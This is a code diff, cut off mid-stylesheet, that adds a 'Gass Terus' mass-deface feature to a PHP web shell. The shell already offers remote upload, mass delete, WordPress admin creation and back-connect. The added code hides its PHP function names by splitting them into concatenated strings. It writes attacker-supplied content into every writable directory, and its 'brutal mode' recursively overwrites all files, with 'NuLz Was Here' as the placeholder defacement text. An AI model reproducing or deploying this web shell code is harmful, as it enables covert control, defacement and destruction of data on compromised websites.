@@ -1251,6 +1251,7 @@ $path = str_replace("\\", "/", $path);
             <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
             <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
             <a href="?option&path=<?= $path ?>&ziper"><button type="button" name="ziper" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-regular fa-file-zipper"></i>&nbsp;Ziper</button>
+            <a href="?option&path=<?= $path ?>&Gass_Terus"><button type="button" name="gasterus" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-masks-theater"></i>&nbsp;Gass Terus</button>
             <a href="?option&path=<?= $path ?>&mass_delete"><button type="button" name="massdelete" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-trash-can"></i>&nbsp;Mass Delete</button>
             <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
             <a href="?option&path=<?= $path ?>&backConnect"><button type="button" name="backConnect" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-300 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-sharp fa-light fa-chart-network"></i></i>&nbsp;Back Connect</button></a>
@@ -1937,6 +1938,1233 @@ $path = str_replace("\\", "/", $path);
         echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
         echo '<button type="submit" name="btn-remote" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save File</button>';
         echo '</form>';
+    }
+
+    if (isset($_GET['Gass_Terus'])) {
+        $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
+        $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
+        $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
+        $is_d = 'is'.'_'.'d'.'i'.'r';
+        $is_f = 'is'.'_'.'f'.'i'.'l'.'e';
+        $scn_d = 'sc'.'an'.'d'.'ir';
+        $glb = 'g'.'l'.'o'.'b';
+        function mass_normal($path, $gasterusfilename, $gasterusfilcontent) {
+            global $f_put;
+            global $is_w;
+            global $is_r;
+            global $is_d;
+            global $scn_d;
+            global $txtWhite;
+            global $txtEmerald;
+            global $txtGreen;
+            global $txtYellow;
+            if ($is_w) {
+                $scan = $scn_d($path);
+                foreach ($scan as $dir) {
+                    $this_dir = "$path/$dir";
+                    $this_files = "$this_dir/$gasterusfilename";
+                    $gtfiles = str_replace('\\', '/', $this_files);
+                    if ($dir === '.') {
+                        $f_put($gtfiles, $gasterusfilcontent);
+                    } elseif ($dir === '..') {
+                        $f_put($gtfiles, $gasterusfilcontent);
+                    } else {
+                        if($is_d($this_dir)) {
+                            if($is_w($this_dir)) {
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$gtfiles.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$path.'/'.$gasterusfilename.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                $f_put($gtfiles, $gasterusfilcontent);
+                            }
+                        }
+                    }
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
+            }
+        }
+        function mass_brutal($path, $gasterusfilcontent) {
+            global $f_put;
+            global $is_w;
+            global $is_r;
+            global $is_d;
+            global $scn_d;
+            global $glb;
+            global $txtWhite;
+            global $txtRed;
+            global $txtGreen;
+            global $txtYellow;
+            global $txtEmerald;
+            if ($is_w) {
+                $scan = $scn_d($path);
+                foreach ($scan as $dir) {
+                    $this_dir = "$path/$dir";
+                    $getallfile = $glb($path . '*', GLOB_MARK);
+                    foreach ($getallfile as $gasterusfilename) {
+                    $gtfiles = str_replace('\\', '/', $gasterusfilename);
+                        if ($dir === '.') {
+                            $f_put($gtfiles, $gasterusfilcontent);
+                        } elseif ($dir === '..') {
+                            $f_put($gtfiles, $gasterusfilcontent);
+                        } else {
+                            if($is_d($this_dir)) {
+                                if($is_w($this_dir)) {
+                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$gtfiles.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                    $f_put($gtfiles, $gasterusfilcontent);
+                                    mass_brutal($gtfiles, $gasterusfilcontent);
+                                }
+                            }
+                        }
+                    }
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
+            }
+        }
+        if (isset($_POST['btn-normal-mode'])) {
+            $gtpatch = $_POST['gasteruspath'];
+            $gtfilesname = $_POST['gasterusfile'];
+            $gtfilescontent = $_POST['gasterusfilecontent'];
+            mass_normal($gtpatch, $gtfilesname, $gtfilescontent);
+        }
+
+        if (isset($_POST['btn-brutal-mode'])) {
+            $gtpatch = $_POST['gasteruspath'];
+            $gtfilescontent = $_POST['gasterusfilecontent'];
+            mass_brutal($gtpatch, $gtfilescontent);
+        }
+        echo '
+        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
+            <label for="mode" class="block mb-2 text-sm font-medium '.$txtBlue.'">Change Mode</label>
+            <select id="mode" name="mode" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                <option>Select Mode</option>
+                <option value="normal">NORMAL MODE</option>
+                <option value="brutal">BRUTAL MODE</option>
+            </select>
+        </form>';
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            $mode = $_POST['mode'];
+            $normal = 'normal';
+            $brutal = 'brutal';
+            if ($mode == $normal) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtYellow.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
+                echo '<label class="block">
+            <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="gasteruspath">
+            </label>';
+                echo '<label class="block">
+            <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="gasterusfile">
+            </label>';
+            echo '
+            <style type="text/css">
+            @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
+    
+            #divCodeWrapper {
+                height: 80vh;
+                width: 100%;
+                overflow: hidden;
+                border: 1px solid #a5a5a5;
+                position: relative;
+            }
+    
+            #preCode {
+                height: 100%;
+                width: 100%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                overflow: hidden;
+                padding: 0;
+                margin: 0;
+                background: #1b1b1b;
+            }
+    
+                #preCode code {
+                    padding: 15px;
+                    height: calc(100% - 30px);
+                    width: calc(100% - 30px);
+                    font-family: "Roboto Mono", monospace;
+                    font-weight: 400;
+                    font-size: 12pt;
+                    line-height: 150%;
+                    overflow-y: scroll;
+                    overflow-x: auto;
+                }
+    
+            textarea {
+                font-family: "Roboto Mono", monospace;
+                font-weight: 400;
+                font-size: 12pt;
+                line-height: 150%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: calc(100% - 30px);
+                width: calc(100% - 30px);
+                padding: 15px;
+                z-index: 2;
+                overflow-x: auto;
+                overflow-y: scroll;
+                white-space: nowrap;
+                background-color: rgba(0,0,0,0);
+                color: rgba(0,0,0,0);
+                caret-color: white;
+            }
+        </style>
+        <span class="block '.$txtBlue.' font-medium">Filecontent <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+        <span>Theme:</span>
+            <select id="selectStyle" class="bg-black">
+                <option>a11y-dark.min.css</option>
+                <option>a11y-light.min.css</option>
+                <option>agate.min.css</option>
+                <option>an-old-hope.min.css</option>
+                <option>androidstudio.min.css</option>
+                <option>arduino-light.min.css</option>
+                <option>arta.min.css</option>
+                <option>ascetic.min.css</option>
+                <option>atom-one-dark-reasonable.min.css</option>
+                <option>atom-one-dark.min.css</option>
+                <option>atom-one-light.min.css</option>
+                <option>brown-paper.min.css</option>
+                <option>codepen-embed.min.css</option>
+                <option>color-brewer.min.css</option>
+                <option>dark.min.css</option>
+                <option>default.min.css</option>
+                <option>devibeans.min.css</option>
+                <option>docco.min.css</option>
+                <option>far.min.css</option>
+                <option>felipec.min.css</option>
+                <option>foundation.min.css</option>
+                <option>github-dark-dimmed.min.css</option>
+                <option>github-dark.min.css</option>
+                <option>github.min.css</option>
+                <option>gml.min.css</option>
+                <option>googlecode.min.css</option>
+                <option>gradient-dark.min.css</option>
+                <option>gradient-light.min.css</option>
+                <option>grayscale.min.css</option>
+                <option>hybrid.min.css</option>
+                <option>idea.min.css</option>
+                <option>intellij-light.min.css</option>
+                <option>ir-black.min.css</option>
+                <option>isbl-editor-dark.min.css</option>
+                <option>isbl-editor-light.min.css</option>
+                <option>kimbie-dark.min.css</option>
+                <option>kimbie-light.min.css</option>
+                <option>lightfair.min.css</option>
+                <option>lioshi.min.css</option>
+                <option>magula.min.css</option>
+                <option>mono-blue.min.css</option>
+                <option>monokai-sublime.min.css</option>
+                <option>monokai.min.css</option>
+                <option>night-owl.min.css</option>
+                <option>nnfx-dark.min.css</option>
+                <option>nnfx-light.min.css</option>
+                <option>nord.min.css</option>
+                <option>obsidian.min.css</option>
+                <option>panda-syntax-dark.min.css</option>
+                <option>panda-syntax-light.min.css</option>
+                <option>paraiso-dark.min.css</option>
+                <option>paraiso-light.min.css</option>
+                <option>pojoaque.min.css</option>
+                <option>purebasic.min.css</option>
+                <option>qtcreator-dark.min.css</option>
+                <option>qtcreator-light.min.css</option>
+                <option>rainbow.min.css</option>
+                <option>routeros.min.css</option>
+                <option>school-book.min.css</option>
+                <option>shades-of-purple.min.css</option>
+                <option>srcery.min.css</option>
+                <option>stackoverflow-dark.min.css</option>
+                <option>stackoverflow-light.min.css</option>
+                <option>sunburst.min.css</option>
+                <option>tokyo-night-dark.min.css</option>
+                <option>tokyo-night-light.min.css</option>
+                <option>tomorrow-night-blue.min.css</option>
+                <option>tomorrow-night-bright.min.css</option>
+                <option>vs.min.css</option>
+                <option selected>vs2015.min.css</option>
+                <option>xcode.min.css</option>
+                <option>xt256.min.css</option>
+                <option>base16/3024.min.css</option>
+                <option>base16/apathy.min.css</option>
+                <option>base16/apprentice.min.css</option>
+                <option>base16/ashes.min.css</option>
+                <option>base16/atelier-cave-light.min.css</option>
+                <option>base16/atelier-cave.min.css</option>
+                <option>base16/atelier-dune-light.min.css</option>
+                <option>base16/atelier-dune.min.css</option>
+                <option>base16/atelier-estuary-light.min.css</option>
+                <option>base16/atelier-estuary.min.css</option>
+                <option>base16/atelier-forest-light.min.css</option>
+                <option>base16/atelier-forest.min.css</option>
+                <option>base16/atelier-heath-light.min.css</option>
+                <option>base16/atelier-heath.min.css</option>
+                <option>base16/atelier-lakeside-light.min.css</option>
+                <option>base16/atelier-lakeside.min.css</option>
+                <option>base16/atelier-plateau-light.min.css</option>
+                <option>base16/atelier-plateau.min.css</option>
+                <option>base16/atelier-savanna-light.min.css</option>
+                <option>base16/atelier-savanna.min.css</option>
+                <option>base16/atelier-seaside-light.min.css</option>
+                <option>base16/atelier-seaside.min.css</option>
+                <option>base16/atelier-sulphurpool-light.min.css</option>
+                <option>base16/atelier-sulphurpool.min.css</option>
+                <option>base16/atlas.min.css</option>
+                <option>base16/bespin.min.css</option>
+                <option>base16/black-metal-bathory.min.css</option>
+                <option>base16/black-metal-burzum.min.css</option>
+                <option>base16/black-metal-dark-funeral.min.css</option>
+                <option>base16/black-metal-gorgoroth.min.css</option>
+                <option>base16/black-metal-immortal.min.css</option>
+                <option>base16/black-metal-khold.min.css</option>
+                <option>base16/black-metal-marduk.min.css</option>
+                <option>base16/black-metal-mayhem.min.css</option>
+                <option>base16/black-metal-nile.min.css</option>
+                <option>base16/black-metal-venom.min.css</option>
+                <option>base16/black-metal.min.css</option>
+                <option>base16/brewer.min.css</option>
+                <option>base16/bright.min.css</option>
+                <option>base16/brogrammer.min.css</option>
+                <option>base16/brush-trees-dark.min.css</option>
+                <option>base16/brush-trees.min.css</option>
+                <option>base16/chalk.min.css</option>
+                <option>base16/circus.min.css</option>
+                <option>base16/classic-dark.min.css</option>
+                <option>base16/classic-light.min.css</option>
+                <option>base16/codeschool.min.css</option>
+                <option>base16/colors.min.css</option>
+                <option>base16/cupcake.min.css</option>
+                <option>base16/cupertino.min.css</option>
+                <option>base16/danqing.min.css</option>
+                <option>base16/darcula.min.css</option>
+                <option>base16/dark-violet.min.css</option>
+                <option>base16/darkmoss.min.css</option>
+                <option>base16/darktooth.min.css</option>
+                <option>base16/decaf.min.css</option>
+                <option>base16/default-dark.min.css</option>
+                <option>base16/default-light.min.css</option>
+                <option>base16/dirtysea.min.css</option>
+                <option>base16/dracula.min.css</option>
+                <option>base16/edge-dark.min.css</option>
+                <option>base16/edge-light.min.css</option>
+                <option>base16/eighties.min.css</option>
+                <option>base16/embers.min.css</option>
+                <option>base16/equilibrium-dark.min.css</option>
+                <option>base16/equilibrium-gray-dark.min.css</option>
+                <option>base16/equilibrium-gray-light.min.css</option>
+                <option>base16/equilibrium-light.min.css</option>
+                <option>base16/espresso.min.css</option>
+                <option>base16/eva-dim.min.css</option>
+                <option>base16/eva.min.css</option>
+                <option>base16/flat.min.css</option>
+                <option>base16/framer.min.css</option>
+                <option>base16/fruit-soda.min.css</option>
+                <option>base16/gigavolt.min.css</option>
+                <option>base16/github.min.css</option>
+                <option>base16/google-dark.min.css</option>
+                <option>base16/google-light.min.css</option>
+                <option>base16/grayscale-dark.min.css</option>
+                <option>base16/grayscale-light.min.css</option>
+                <option>base16/green-screen.min.css</option>
+                <option>base16/gruvbox-dark-hard.min.css</option>
+                <option>base16/gruvbox-dark-medium.min.css</option>
+                <option>base16/gruvbox-dark-pale.min.css</option>
+                <option>base16/gruvbox-dark-soft.min.css</option>
+                <option>base16/gruvbox-light-hard.min.css</option>
+                <option>base16/gruvbox-light-medium.min.css</option>
+                <option>base16/gruvbox-light-soft.min.css</option>
+                <option>base16/hardcore.min.css</option>
+                <option>base16/harmonic16-dark.min.css</option>
+                <option>base16/harmonic16-light.min.css</option>
+                <option>base16/heetch-dark.min.css</option>
+                <option>base16/heetch-light.min.css</option>
+                <option>base16/helios.min.css</option>
+                <option>base16/hopscotch.min.css</option>
+                <option>base16/horizon-dark.min.css</option>
+                <option>base16/horizon-light.min.css</option>
+                <option>base16/humanoid-dark.min.css</option>
+                <option>base16/humanoid-light.min.css</option>
+                <option>base16/ia-dark.min.css</option>
+                <option>base16/ia-light.min.css</option>
+                <option>base16/icy-dark.min.css</option>
+                <option>base16/ir-black.min.css</option>
+                <option>base16/isotope.min.css</option>
+                <option>base16/kimber.min.css</option>
+                <option>base16/london-tube.min.css</option>
+                <option>base16/macintosh.min.css</option>
+                <option>base16/marrakesh.min.css</option>
+                <option>base16/materia.min.css</option>
+                <option>base16/material-darker.min.css</option>
+                <option>base16/material-lighter.min.css</option>
+                <option>base16/material-palenight.min.css</option>
+                <option>base16/material-vivid.min.css</option>
+                <option>base16/material.min.css</option>
+                <option>base16/mellow-purple.min.css</option>
+                <option>base16/mexico-light.min.css</option>
+                <option>base16/mocha.min.css</option>
+                <option>base16/monokai.min.css</option>
+                <option>base16/nebula.min.css</option>
+                <option>base16/nord.min.css</option>
+                <option>base16/nova.min.css</option>
+                <option>base16/ocean.min.css</option>
+                <option>base16/oceanicnext.min.css</option>
+                <option>base16/one-light.min.css</option>
+                <option>base16/onedark.min.css</option>
+                <option>base16/outrun-dark.min.css</option>
+                <option>base16/papercolor-dark.min.css</option>
+                <option>base16/papercolor-light.min.css</option>
+                <option>base16/paraiso.min.css</option>
+                <option>base16/pasque.min.css</option>
+                <option>base16/phd.min.css</option>
+                <option>base16/pico.min.css</option>
+                <option>base16/pop.min.css</option>
+                <option>base16/porple.min.css</option>
+                <option>base16/qualia.min.css</option>
+                <option>base16/railscasts.min.css</option>
+                <option>base16/rebecca.min.css</option>
+                <option>base16/ros-pine-dawn.min.css</option>
+                <option>base16/ros-pine-moon.min.css</option>
+                <option>base16/ros-pine.min.css</option>
+                <option>base16/sagelight.min.css</option>
+                <option>base16/sandcastle.min.css</option>
+                <option>base16/seti-ui.min.css</option>
+                <option>base16/shapeshifter.min.css</option>
+                <option>base16/silk-dark.min.css</option>
+                <option>base16/silk-light.min.css</option>
+                <option>base16/snazzy.min.css</option>
+                <option>base16/solar-flare-light.min.css</option>
+                <option>base16/solar-flare.min.css</option>
+                <option>base16/solarized-dark.min.css</option>
+                <option>base16/solarized-light.min.css</option>
+                <option>base16/spacemacs.min.css</option>
+                <option>base16/summercamp.min.css</option>
+                <option>base16/summerfruit-dark.min.css</option>
+                <option>base16/summerfruit-light.min.css</option>
+                <option>base16/synth-midnight-terminal-dark.min.css</option>
+                <option>base16/synth-midnight-terminal-light.min.css</option>
+                <option>base16/tango.min.css</option>
+                <option>base16/tender.min.css</option>
+                <option>base16/tomorrow-night.min.css</option>
+                <option>base16/tomorrow.min.css</option>
+                <option>base16/twilight.min.css</option>
+                <option>base16/unikitty-dark.min.css</option>
+                <option>base16/unikitty-light.min.css</option>
+                <option>base16/vulcan.min.css</option>
+                <option>base16/windows-10-light.min.css</option>
+                <option>base16/windows-10.min.css</option>
+                <option>base16/windows-95-light.min.css</option>
+                <option>base16/windows-95.min.css</option>
+                <option>base16/windows-high-contrast-light.min.css</option>
+                <option>base16/windows-high-contrast.min.css</option>
+                <option>base16/windows-nt-light.min.css</option>
+                <option>base16/windows-nt.min.css</option>
+                <option>base16/woodland.min.css</option>
+                <option>base16/xcode-dusk.min.css</option>
+                <option>base16/zenburn.min.css</option>
+            </select><br><br>
+            <span>Font:</span>
+            <select id="selectFont" class="bg-black">
+                <option>Roboto Mono</option>
+                <option>Consolas</option>
+                <option>Cascadia Mono</option>
+                <option>Inconsolata</option>
+                <option>Source Code Pro</option>
+                <option>IBM Plex Mono</option>
+                <option>Space Mono</option>
+                <option>PT Mono</option>
+                <option>Ubuntu Mono</option>
+                <option>Nanum Gothic Coding</option>
+                <option>Cousine</option>
+                <option>Fira Mono</option>
+                <option>Share Tech Mono</option>
+                <option>Courier Prime</option>
+                <option>Anonymous Pro</option>
+                <option>Cutive Mono</option>
+                <option>VT323</option>
+                <option>JetBrains Mono</option>
+                <option>Noto Sans Mono</option>
+                <option>Red Hat Mono</option>
+                <option>Martian Mono</option>
+                <option>Major Mono Display</option>
+                <option>Nova Mono</option>
+                <option>Syne Mono</option>
+                <option>Xanh Mono</option>
+                <option>Monofett</option>
+            </select><br><br>
+            <span>Font Size (pt):</span>
+            <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
+            <span>Language:</span>
+            <select id="selectLanguage" class="bg-black">
+                <option value="language-html">HTML</option>
+                <option value="language-javascript">JavaScript</option>
+                <option value="language-python">Python</option>
+                <option value="language-java">Java</option>
+                <option value="language-csharp">C#</option>
+                <option value="language-php">PHP</option>
+                <option value="language-cpp">C++</option>
+                <option value="language-typescript">TypeScript</option>
+                <option value="language-ruby">Ruby</option>
+            </select><br><br>
+            <div id="divCodeWrapper">
+                <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
+                <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+            </div>
+            <script type="text/javascript">
+            const textarea1 = document.getElementById("textarea1");
+            const codeBlock = document.getElementById("codeBlock");
+            let content = textarea1.value;
+            content = content.replace(/&/g, "&amp;");
+            content = content.replace(/</g, "&lt;");
+            content = content.replace(/>/g, "&gt;");
+            codeBlock.innerHTML = content;
+            highlightJS();
+    
+            function updateCode() {
+                let content = textarea1.value;
+                content = content.replace(/&/g, "&amp;");
+                content = content.replace(/</g, "&lt;");
+                content = content.replace(/>/g, "&gt;");
+                codeBlock.innerHTML = content;
+                highlightJS();
+            }
+    
+            function highlightJS() {
+                document.querySelectorAll("pre code").forEach((el) => {
+                    hljs.highlightElement(el);
+                });
+            }
+    
+            textarea1.addEventListener("input", () => {
+                updateCode();
+            });
+    
+            textarea1.addEventListener("scroll", () => {
+                codeBlock.scrollTop = textarea1.scrollTop;
+                codeBlock.scrollLeft = textarea1.scrollLeft;
+            });
+    
+            textarea1.addEventListener("keydown", function (e) {
+                if (e.key === "Enter") {
+                    e.preventDefault();
+                    var cursorPos = textarea1.selectionStart;
+                    var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
+                    var indent = prevLine.match(/^\s*/)[0];
+                    textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
+                    textarea1.blur();
+                    textarea1.focus();
+                    updateCode();
+                    return;
+                }
+                if (e.key === "Tab" && !e.shiftKey &&
+                    textarea1.selectionStart == textarea1.selectionEnd) {
+                    e.preventDefault();
+                    let cursorPosition = textarea1.selectionStart;
+                    let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
+                        textarea1.value.substring(cursorPosition);
+                    textarea1.value = newValue;
+                    textarea1.selectionStart = cursorPosition + 4;
+                    textarea1.selectionEnd = cursorPosition + 4;    
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key === "Tab" && e.shiftKey &&
+    
+                    textarea1.selectionStart == textarea1.selectionEnd) {
+    
+                    e.preventDefault();
+    
+                    let cursorPosition = textarea1.selectionStart;
+                    let leadingSpaces = 0;
+                    for (let i = 0; i < 4; i++) {
+                        if (textarea1.value[cursorPosition - i - 1] === " ") {
+                            leadingSpaces++;
+                        } else {
+                            break;
+                        }
+                    }
+    
+                    if (leadingSpaces > 0) {
+                        let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
+                            textarea1.value.substring(cursorPosition);
+                        textarea1.value = newValue;
+                        textarea1.selectionStart = cursorPosition - leadingSpaces;
+                        textarea1.selectionEnd = cursorPosition - leadingSpaces;
+                    }
+    
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
+                    e.preventDefault();
+                    let lines = this.value.split("\n");
+    
+                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+    
+                    let spacesRemovedFirstLine = 0;
+                    let spacesRemoved = 0;
+    
+                    if (e.shiftKey) {
+                        for (let i = startPos; i <= endPos; i++) {
+                            lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
+                                if (i == startPos)
+                                    spacesRemovedFirstLine = match.length;
+                                spacesRemoved += match.length;
+    
+                                return "";
+                            });
+                        }
+                    } else {
+                        for (let i = startPos; i <= endPos; i++) {
+                            lines[i] = "    " + lines[i];
+                        }
+                    }
+                    let start = this.selectionStart;
+                    let end = this.selectionEnd;
+                    this.value = lines.join("\n");
+                    this.selectionStart = e.shiftKey ?
+                        start - spacesRemovedFirstLine : start + 4;
+                    this.selectionEnd = e.shiftKey ?
+                        end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
+                    updateCode();
+                    return;
+                }
+                if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
+    
+                    e.preventDefault();
+                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+                    let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
+                    let cursorPosInLine = cursorLine.length;
+                    let totalLinesRemove = endPos - startPos + 1;
+                    let lines = this.value.split("\n");
+                    let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
+                    lines.splice(startPos, totalLinesRemove);
+                    let newLine = lines[startPos] || "";
+                    if (newLine.length < cursorPosInLine) {
+                        cursorPosInLine = newLine.length;
+                    }
+                    newStart += cursorPosInLine;
+    
+                    this.value = lines.join("\n");
+                    this.selectionStart = this.selectionEnd = newStart; 
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key === "Home") {
+                    let line = this.value.substring(0, this.selectionStart).split("\n").pop();
+                    let cursorPosInLine = line.length;
+                    let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
+                    let firstNonWhitespacePos = line.search(/\S/);
+                    if (firstNonWhitespacePos >= cursorPosInLine) {
+                        return true;
+                    }
+                    else if (firstNonWhitespacePos === -1) {
+                        return true;
+                    }
+                    e.preventDefault();
+                    this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
+                    return;
+                }
+            });
+    
+            document.getElementById("selectStyle").addEventListener("change", (e) => {
+                document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
+            });
+    
+            function updateFont() {
+                let selectFont = document.getElementById("selectFont");
+                let fontName = selectFont.options[selectFont.selectedIndex].text;
+                let fontNameUrl = fontName.replace(" ", "+");
+                let inputFontSize = document.getElementById("inputFontSize");
+                document.getElementById("style2").textContent = `
+                @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
+                pre, code, textarea {
+                    font-family: "${fontName}", monospace !important;
+                    font-size: ${inputFontSize.value}pt !important;
+                }`;
+            }
+    
+            document.getElementById("selectLanguage").addEventListener("change", function () {
+                document.getElementById("codeBlock").className = this.value;
+                highlightJS();
+            });
+    
+            document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });
+
+            document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
+            </script>
+            ';
+        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+        echo '<button type="submit" name="btn-normal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Gass Terus</button>';
+        echo '</form>';
+            } elseif ($mode === $brutal) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtRed.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
+                echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="gasteruspath">
+                    </label>';
+                        echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <span class="block '.$txtRed.'">(<font class="'.$txtYellow.' font-bold">WARNING</font>) This GASSPOLL All Files! <font class="'.$txtYellow.' font-bold">DANGEROUS!</font></span>
+                    </label>';
+                    echo '
+                    <style type="text/css">
+                    @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
+
+                    #divCodeWrapper {
+                        height: 80vh;
+                        width: 100%;
+                        overflow: hidden;
+                        border: 1px solid #a5a5a5;
+                        position: relative;
+                    }
+
+                    #preCode {
+                        height: 100%;
+                        width: 100%;
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        overflow: hidden;
+                        padding: 0;
+                        margin: 0;
+                        background: #1b1b1b;
+                    }
+
+                        #preCode code {
+                            padding: 15px;
+                            height: calc(100% - 30px);
+                            width: calc(100% - 30px);
